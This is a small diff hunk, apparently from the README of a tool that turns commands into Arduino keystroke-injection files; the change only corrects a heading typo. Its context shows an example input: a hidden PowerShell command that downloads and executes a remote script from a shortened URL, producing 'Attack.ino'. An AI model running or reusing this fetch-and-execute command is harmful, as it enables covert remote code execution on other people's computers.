@@ -10,7 +10,7 @@
     Enter command to execute: powershell -window hidden IEX (New-Object System.Net.Webclient).DownloadString('https://tinyurl.com/z766ych')
     Attack.ino file created successfully!
 
-##Ouput
+##Output
 
 ```    
 #define KEY_DELETE 76
